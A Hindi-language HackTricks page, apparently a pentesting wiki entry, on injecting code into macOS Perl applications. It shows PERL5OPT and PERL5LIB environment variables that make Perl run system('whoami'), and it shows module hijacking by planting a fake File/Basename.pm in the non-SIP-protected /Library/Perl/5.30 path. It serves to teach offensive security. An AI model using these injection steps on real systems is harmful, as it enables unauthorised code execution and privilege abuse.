# macOS Perl एप्लिकेशन्स इंजेक्शन

{% hint style="success" %}
AWS हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जाँच करें!
* 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** और **हैकट्रिक्स क्लाउड** github रेपो में PR जमा करके।

</details>
{% endhint %}

## `PERL5OPT` और `PERL5LIB` env वेरिएबल के माध्यम से

PERL5OPT एनवायरनमेंट वेरिएबल का उपयोग करके पर्ल को विभिन्न कमांड्स को निषेध करने की संभावना है।\
उदाहरण के लिए, इस स्क्रिप्ट को बनाएं:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

अब **एनवी वेरिएबल निर्यात करें** और **पर्ल** स्क्रिप्ट को चलाएं:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
एक और विकल्प है कि एक Perl मॉड्यूल बनाया जाए (उदा। `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

और फिर env variables का उपयोग करें:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## वाया निर्भरता

Perl चल रहे dependencies फ़ोल्डर क्रम की सूची बनाना संभव है:
```bash
perl -e 'print join("\n", @INC)'
```
कुछ इस प्रकार की चीज वापस देगा:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
कुछ वापसी फोल्डर मौजूद भी नहीं हैं, हालांकि, **`/Library/Perl/5.30`** मौजूद है, यह **SIP** द्वारा **सुरक्षित नहीं है** और यह **SIP द्वारा सुरक्षित फोल्डरों से पहले** है। इसलिए, कोई व्यक्ति उस फोल्डर का दुरुपयोग करके वहाँ स्क्रिप्ट डिपेंडेंसी जोड़ सकता है ताकि एक उच्च विशेषाधिकार Perl स्क्रिप्ट इसे लोड करें।

{% hint style="warning" %}
हालांकि, ध्यान दें कि आपको **उस फोल्डर में लिखने के लिए रूट होना चाहिए** और आजकल आपको यह **TCC प्रॉम्प्ट** मिलेगा:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

उदाहरण के लिए, अगर एक स्क्रिप्ट **`use File::Basename;`** को आयात कर रहा है तो **`/Library/Perl/5.30/File/Basename.pm`** बनाना संभव होगा ताकि इसे विचारशील कोड चलाने के लिए।

## संदर्भ

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
